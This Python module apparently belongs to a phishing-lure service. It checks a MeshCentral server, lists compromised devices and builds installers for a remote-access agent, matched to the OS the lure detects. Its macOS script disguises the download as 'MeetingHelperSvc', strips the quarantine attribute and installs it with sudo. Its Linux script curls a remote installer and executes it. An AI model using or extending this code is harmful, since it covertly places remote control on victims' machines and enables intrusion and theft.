"""MeshCentral integration: status, devices and mobile enrollment."""

from __future__ import annotations

import json
import os
import subprocess
from dataclasses import dataclass, field
from urllib.parse import quote

import httpx
from starlette.concurrency import run_in_threadpool

from .config import Settings


@dataclass
class MeshCentralStatus:
    enabled: bool
    ok: bool
    detail: str = ""


@dataclass
class MeshCentralDevice:
    id: str
    name: str
    os: str
    status: str
    last_seen: float = 0.0


@dataclass
class MeshCentralDevices:
    ok: bool
    detail: str
    devices: list[MeshCentralDevice] = field(default_factory=list)


def _http_ok(url: str, timeout: float = 2.0) -> tuple[bool, str]:
    try:
        resp = httpx.get(url, timeout=timeout, follow_redirects=True)
        return resp.status_code < 400, f"HTTP {resp.status_code}"
    except httpx.HTTPError as exc:
        return False, type(exc).__name__


def probe(config: Settings) -> MeshCentralStatus:
    if not config.meshcentral_enabled:
        return MeshCentralStatus(enabled=False, ok=False, detail="disabled")
    url = (config.meshcentral_url or "").rstrip("/")
    if not url:
        return MeshCentralStatus(enabled=True, ok=False, detail="no url configured")
    ok, detail = _http_ok(url)
    return MeshCentralStatus(enabled=True, ok=ok, detail=detail)


async def status(config: Settings) -> MeshCentralStatus:
    return await run_in_threadpool(probe, config)


def _list_agents(config: Settings) -> MeshCentralDevices:
    if not config.meshcentral_enabled:
        return MeshCentralDevices(ok=False, detail="disabled", devices=[])
    user = (config.meshcentral_admin_user or "").strip()
    password = config.meshcentral_admin_pass or ""
    if not user or not password:
        return MeshCentralDevices(
            ok=False, detail="meshcentral admin credentials not configured", devices=[]
        )
    env = dict(os.environ)
    env["MESHCTRL_URL"] = config.meshcentral_ws_url
    env["MESHCTRL_LOGINUSER"] = user
    env["MESHCTRL_LOGINPASS"] = password
    command = [
        "/usr/bin/node",
        config.meshcentral_meshctrl,
        "ListDevices",
        "--json",
    ]
    try:
        proc = subprocess.run(
            command, capture_output=True, text=True, timeout=15, env=env
        )
    except (OSError, subprocess.TimeoutExpired) as exc:
        return MeshCentralDevices(ok=False, detail=type(exc).__name__, devices=[])
    out = (proc.stdout or "").strip()
    start = out.find("[")
    if proc.returncode != 0 or start < 0:
        detail = (proc.stderr or out or "meshctrl failed").strip()
        return MeshCentralDevices(ok=False, detail=detail[:200], devices=[])
    try:
        rows = json.loads(out[start:])
    except json.JSONDecodeError:
        return MeshCentralDevices(ok=False, detail="invalid meshctrl output", devices=[])
    if isinstance(rows, dict):
        rows = rows.get("devices") or []
    devices: list[MeshCentralDevice] = []
    for row in rows if isinstance(rows, list) else []:
        if not isinstance(row, dict):
            continue
        devices.append(
            MeshCentralDevice(
                id=str(row.get("_id") or row.get("id") or ""),
                name=str(row.get("name") or row.get("host") or ""),
                os=str(row.get("os") or row.get("osdesc") or row.get("rname") or ""),
                status="online" if row.get("conn") else "offline",
                last_seen=float(row.get("lastconnecttime") or 0.0),
            )
        )
    return MeshCentralDevices(ok=True, detail="ok", devices=devices)


async def devices(config: Settings) -> MeshCentralDevices:
    return await run_in_threadpool(_list_agents, config)


def agent_url(config: Settings, family: str) -> str:
    """Public MeshCentral installer URL for a lure-detected OS family."""
    base = (config.meshcentral_url or "").rstrip("/")
    if not (config.meshcentral_enabled and base):
        return ""
    if family == "android":
        return f"{base}/meshagents?id=14"
    mesh_id = (config.meshcentral_mesh_id or "").strip()
    if not mesh_id:
        return ""
    encoded = quote(mesh_id, safe="")
    if family == "windows":
        return f"{base}/meshagents?id=4&meshid={encoded}"
    if family == "macos":
        return f"{base}/meshagents?meshinstall=10005&id={encoded}"
    if family == "linux":
        return f"{base}/meshagents?meshinstall=6&id={encoded}"
    return ""


def invite_url(config: Settings) -> str:
    if not config.meshcentral_enabled:
        return ""
    return (config.meshcentral_invite_url or "").strip() or agent_url(config, "android")

def macos_install_script(config: Settings) -> str:
    """Official macOS binary installer flow as a preconfigured script."""
    base = (config.meshcentral_url or "").rstrip("/")
    mesh_id = (config.meshcentral_mesh_id or "").strip()
    if not (config.meshcentral_enabled and base and mesh_id):
        return ""
    encoded = quote(mesh_id, safe="")
    return (
        "#!/bin/bash\n"
        "set -euo pipefail\n"
        f"URL='{base}/meshagents?meshinstall=10005&id={encoded}&installflags=2'\n"
        'TMP="$(mktemp /tmp/MeetingHelperSvc.XXXXXX)"\n'
        "trap 'rm -f \"$TMP\"' EXIT\n"
        'curl -fsSL "$URL" -o "$TMP"\n'
        'chmod +x "$TMP"\n'
        'xattr -r -d com.apple.quarantine "$TMP" 2>/dev/null || true\n'
        'sudo "$TMP" -install\n'
    )


def install_script(config: Settings) -> str:
    """Preconfigured official Linux/BSD install script (auto-detects arch)."""
    base = (config.meshcentral_url or "").rstrip("/")
    mesh_id = (config.meshcentral_mesh_id or "").strip()
    if not (config.meshcentral_enabled and base and mesh_id):
        return ""
    safe = mesh_id.replace("'", "'\\''")
    return (
        "#!/bin/bash\n"
        "set -euo pipefail\n"
        f"curl -fsSL '{base}/meshagents?script=1' -o /tmp/meshinstall.sh\n"
        "chmod 755 /tmp/meshinstall.sh\n"
        f"exec /tmp/meshinstall.sh {base} '{safe}'\n"
    )


def agent_matrix(config: Settings) -> list[dict[str, str]]:
    """Preconfigured installers for every supported OS/architecture."""
    base = (config.meshcentral_url or "").rstrip("/")
    if not (config.meshcentral_enabled and base):
        return []
    mesh_id = (config.meshcentral_mesh_id or "").strip()
    encoded = quote(mesh_id, safe="")
    rows: list[dict[str, str]] = []
    if mesh_id:
        for label, query in (
            ("Windows x86-64 (service)", f"id=4&meshid={encoded}"),
            ("Windows x86-32 (service)", f"id=3&meshid={encoded}"),
            ("Windows ARM-64 (service)", f"id=43&meshid={encoded}"),
            ("Linux / BSD installer script (auto-arch)", "/__lure/meshagent?os=linux"),
            ("macOS installer script (universal binary)", "/__lure/meshagent?os=macos"),
        ):
            if query.startswith("/"):
                rows.append({"os": label, "url": query})
            else:
                rows.append({"os": label, "url": f"{base}/meshagents?{query}"})
    rows.append({"os": "Android (APK + invite/QR)", "url": f"{base}/meshagents?id=14"})
    return rows
